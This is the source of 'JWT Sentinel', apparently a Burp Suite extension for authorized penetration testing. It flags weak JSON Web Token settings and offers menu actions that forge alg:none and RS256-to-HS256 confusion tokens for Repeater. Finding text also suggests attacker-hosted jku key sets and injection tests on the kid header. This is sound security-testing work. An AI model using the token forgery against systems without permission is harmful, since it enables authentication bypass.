# -*- coding: utf-8 -*-
"""
jwt_sentinel.py — Burp Suite extension (Python / Jython, legacy Extender API).

WHAT IT DOES
    Rides the Burp proxy stream and, on every request/response carrying a JWT:
      * decodes the header and claims,
      * raises a Burp scan issue for weak algorithms (none / HS-when-RS-expected),
        for reused tokens past their `exp`, and for sensitive data sitting in the
        (unencrypted) payload,
      * adds a right-click menu to forge attack variants — alg:none and an
        RS256->HS256 confusion shell — straight into Repeater.

WHY AN EXTENSION AND NOT A SCRIPT
    A script only sees traffic you hand it. This sees EVERY JWT as you browse,
    with zero extra effort, and pushes one-click tampered tokens into Repeater —
    the real-time, integrated visibility is the whole reason to build inside Burp.

RUNTIME
    Burp Suite -> Extensions -> Add -> Extension type: Python (requires Jython
    standalone JAR configured under Settings -> Extensions -> Python environment).
    Jython is Python 2.7, so this file is written 2/3-compatible.

AUTHORIZED USE ONLY — run only against systems you have written permission to test.
"""

import base64
import json
import re
import time

from burp import (IBurpExtender, IScannerCheck, IScanIssue, IContextMenuFactory)
from javax.swing import JMenuItem
from java.util import ArrayList

# header.payload.signature — header segment starts with eyJ (base64url of '{"')
JWT_RE = re.compile(r'eyJ[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]{4,}\.[A-Za-z0-9_-]*')
WEAK_ALGS = ("none",)


def b64url_decode(seg):
    """Base64url-decode a JWT segment, restoring padding. Returns str or None."""
    try:
        pad = "=" * (-len(seg) % 4)
        return base64.urlsafe_b64decode((seg + pad).encode("ascii")).decode("utf-8", "replace")
    except Exception:
        return None


def b64url_encode(raw):
    return base64.urlsafe_b64encode(raw.encode("utf-8")).decode("ascii").rstrip("=")


def parse_jwt(token):
    """Return (header_dict, payload_dict, parts) or (None, None, None)."""
    parts = token.split(".")
    if len(parts) < 2:
        return None, None, None
    try:
        header = json.loads(b64url_decode(parts[0]) or "{}")
        payload = json.loads(b64url_decode(parts[1]) or "{}")
    except Exception:
        return None, None, None
    # A segment can decode to valid JSON that isn't an object (list/number/string);
    # downstream `.get()` calls would crash on it, so reject non-dicts here.
    if not isinstance(header, dict) or not isinstance(payload, dict):
        return None, None, None
    return header, payload, parts


# Payload claims that shouldn't be sitting in a base64 (not encrypted) token.
SENSITIVE_KEYS = ("password", "pwd", "secret", "ssn", "credit", "card", "api_key",
                  "apikey", "private", "pin")


def assess(header, payload):
    """Return a list of (severity, note) weaknesses for a decoded token."""
    findings = []
    alg = str(header.get("alg", "")).lower()

    if alg in WEAK_ALGS:
        findings.append(("High", "alg=none — signature may not be verified (forgeable token)."))
    if alg.startswith("hs"):
        findings.append(("Information",
                         "HMAC (%s) in use — candidate for offline secret cracking and, if the "
                         "server also accepts RS*, algorithm-confusion." % alg.upper()))
    if alg.startswith("rs") or alg.startswith("es"):
        findings.append(("Information",
                         "Asymmetric (%s) — test RS->HS algorithm confusion using the server's "
                         "public key as the HMAC secret." % alg.upper()))
    for h in ("jku", "x5u"):
        if h in header:
            findings.append(("High",
                             "Header '%s' present — if unvalidated, point it at an attacker-hosted "
                             "key set to sign forged tokens." % h))
    if "kid" in header:
        findings.append(("Low",
                         "Header 'kid' present — test for path traversal / SQLi / command injection "
                         "in key selection."))

    exp = payload.get("exp")
    if exp is not None:
        try:
            if float(exp) < time.time():
                findings.append(("Medium",
                                 "Token past its exp (%s) but still in traffic — test whether the "
                                 "server accepts expired tokens." % exp))
        except Exception:
            pass
    else:
        findings.append(("Low", "No 'exp' claim — token may never expire."))

    def walk(obj, prefix=""):
        if isinstance(obj, dict):
            for k, v in obj.items():
                if any(s in str(k).lower() for s in SENSITIVE_KEYS):
                    findings.append(("Medium",
                                     "Sensitive-looking claim '%s%s' in payload — JWT payloads are "
                                     "base64, NOT encrypted." % (prefix, k)))
                walk(v, prefix + str(k) + ".")
    walk(payload)
    return findings


def extract_tokens(blob):
    """Return unique JWT strings found in a request/response string."""
    seen = []
    for m in JWT_RE.findall(blob or ""):
        if m not in seen and parse_jwt(m)[0] is not None:
            seen.append(m)
    return seen


class JwtIssue(IScanIssue):
    _SEV_RANK = {"High": 3, "Medium": 2, "Low": 1, "Information": 0}

    def __init__(self, base_rr, url, token, findings):
        self._rr = base_rr
        self._url = url
        self._token = token
        self._findings = findings
        self._severity = max(findings, key=lambda f: self._SEV_RANK[f[0]])[0] \
            if findings else "Information"

    def getUrl(self): return self._url
    def getIssueName(self): return "JWT weakness (JWT Sentinel)"
    def getIssueType(self): return 0x08000000
    def getSeverity(self): return self._severity
    def getConfidence(self): return "Tentative"
    def getRemediationBackground(self): return None
    def getHttpService(self): return self._rr.getHttpService()
    def getHttpMessages(self): return [self._rr]

    def getIssueBackground(self):
        return ("JSON Web Tokens carry authentication state. Weak or unverified signatures, "
                "expired-token acceptance, injectable key-selection headers, and sensitive data "
                "in the (non-encrypted) payload each enable authentication bypass or data exposure.")

    def getRemediationDetail(self):
        return ("Pin the accepted algorithm server-side (reject 'none' and unexpected algs), verify "
                "signatures against a fixed key, enforce exp/nbf, validate kid/jku against an allow-list, "
                "and keep sensitive data out of the payload.")

    def getIssueDetail(self):
        rows = "".join("<li><b>%s:</b> %s</li>" % (s, n) for s, n in self._findings)
        return ("Decoded JWT:<br><code>%s</code><br><br>Findings:<ul>%s</ul>"
                % (self._token, rows))


class BurpExtender(IBurpExtender, IScannerCheck, IContextMenuFactory):

    def registerExtenderCallbacks(self, callbacks):
        self._cb = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("JWT Sentinel")
        callbacks.registerScannerCheck(self)
        callbacks.registerContextMenuFactory(self)
        print("[JWT Sentinel] loaded — passive JWT scanning + Repeater forge helpers active.")

    # ---- passive detection -------------------------------------------------
    def doPassiveScan(self, base_rr):
        issues = []
        try:
            req = self._helpers.bytesToString(base_rr.getRequest())
            resp = base_rr.getResponse()
            blob = req + (self._helpers.bytesToString(resp) if resp else "")
            url = self._helpers.analyzeRequest(base_rr).getUrl()
            for tok in extract_tokens(blob):
                header, payload, _ = parse_jwt(tok)
                findings = assess(header, payload)
                if findings:
                    issues.append(JwtIssue(base_rr, url, tok, findings))
        except Exception as e:
            print("[JWT Sentinel] passive scan error: %s" % e)
        return issues if issues else None

    def doActiveScan(self, base_rr, insertion_point):
        return None

    def consolidateDuplicateIssues(self, existing, new_issue):
        # Same token detail => duplicate.
        return -1 if existing.getIssueDetail() == new_issue.getIssueDetail() else 0

    # ---- active forge helpers (right-click -> Repeater) --------------------
    def createMenuItems(self, invocation):
        msgs = invocation.getSelectedMessages()
        if not msgs:
            return None
        req_bytes = msgs[0].getRequest()
        req_str = self._helpers.bytesToString(req_bytes)
        tokens = extract_tokens(req_str)
        if not tokens:
            return None

        menu = ArrayList()
        token = tokens[0]

        def send_variant(new_token, tab):
            # Replace only the FIRST occurrence: forged variants share the token's
            # header/payload prefix, so a global replace could rewrite the wrong span.
            new_req = req_str.replace(token, new_token, 1)
            svc = msgs[0].getHttpService()
            self._cb.sendToRepeater(svc.getHost(), svc.getPort(),
                                    svc.getProtocol() == "https",
                                    self._helpers.stringToBytes(new_req), tab)

        def make_none(event):
            header, payload, parts = parse_jwt(token)
            new_header = b64url_encode(json.dumps({"alg": "none", "typ": "JWT"}))
            send_variant(new_header + "." + parts[1] + ".", "JWT alg:none")

        def make_confusion(event):
            # RS->HS confusion SHELL: swaps alg to HS256, leaves signature blank.
            # Sign header.payload with HMAC using the server's PEM public key, then
            # paste the signature onto the third segment. (Extension can't fetch the
            # key for you — this stages the attack, you supply the key.)
            header, payload, parts = parse_jwt(token)
            new_header = b64url_encode(json.dumps({"alg": "HS256", "typ": "JWT"}))
            send_variant(new_header + "." + parts[1] + ".SIGN_WITH_PUBKEY_HMAC",
                         "JWT RS->HS shell")

        item_none = JMenuItem("JWT Sentinel: forge alg:none -> Repeater",
                              actionPerformed=make_none)
        item_conf = JMenuItem("JWT Sentinel: stage RS->HS confusion -> Repeater",
                              actionPerformed=make_confusion)
        menu.add(item_none)
        menu.add(item_conf)
        return menu
